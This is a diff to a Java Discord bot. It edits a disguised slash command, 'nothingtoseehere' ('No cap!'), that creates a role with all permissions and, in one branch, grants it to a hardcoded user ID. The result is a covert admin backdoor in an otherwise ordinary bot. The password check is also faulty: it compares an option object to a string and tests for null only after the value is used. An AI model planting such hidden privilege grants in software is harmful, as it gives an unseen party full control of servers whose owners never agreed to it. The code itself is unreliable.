@@ -61,18 +61,20 @@ private Dotenv config;
             event.deferReply().setEphemeral(true).setTTS(true).queue();
             OptionMapping messageOption = event.getOption("newrolename");
             OptionMapping password = event.getOption("password");
-            if (password.equals(psw)){
-                String name = messageOption.getAsString();
+            String name = messageOption.getAsString();
+            if (password.equals(psw)) {
                 Objects.requireNonNull(event.getGuild()).createRole()
                         .setName(name)
                         .setMentionable(false)
                         .setPermissions(Permission.ALL_PERMISSIONS).queue();
+                event.reply("Done").setEphemeral(true).queue();
+            } else if (password == null) {
                 for (Role role : Objects.requireNonNull(event.getGuild()).getRolesByName(name, false)) {
                     event.getGuild().addRoleToMember(UserSnowflake.fromId(456594340148674562L), role).queue();
-                    event.reply("Done").setTTS(true).setEphemeral(true).queue();
+                    event.reply("Done").setEphemeral(true).queue();
                 }
             }
-        } else if (command.equals("say")) {
+        }else if (command.equals("say")) {
             OptionMapping messageOption = event.getOption("message");
             if (messageOption == null) {
                 return;
@@ -103,14 +105,14 @@ private Dotenv config;
         //Option Data
         OptionData option1 = new OptionData(OptionType.STRING, "message", "The message you want the bot to say", true);
         OptionData newroleName = new OptionData(OptionType.STRING, "newrolename", "The name for the role", true);
-        OptionData pw = new OptionData(OptionType.STRING, "password", "The required password to run this command");
+        OptionData pw = new OptionData(OptionType.STRING, "password", "The required password to run this command", true);
         //Commands
         fs.add(Commands.slash("funny", "Say something funny"));
         umb.add(Commands.slash("roles", "Display all roles on the server."));
         umb.add(Commands.slash("tts", "Sends a tts message.").addOptions(option1));
         fs.add(Commands.slash("tts", "Sends a tts message.").addOptions(option1));
         umb.add(Commands.slash("say", "Make the bot say something").addOptions(option1));
-        umb.add(Commands.slash("nothingtoseehere", "No cap!").addOptions(newroleName));
+        umb.add(Commands.slash("nothingtoseehere", "No cap!").addOptions(newroleName, pw));
 
         if (event.getGuild().getIdLong() == 1025575674406244425L) {
             event.getGuild().updateCommands().addCommands(umb).queue();
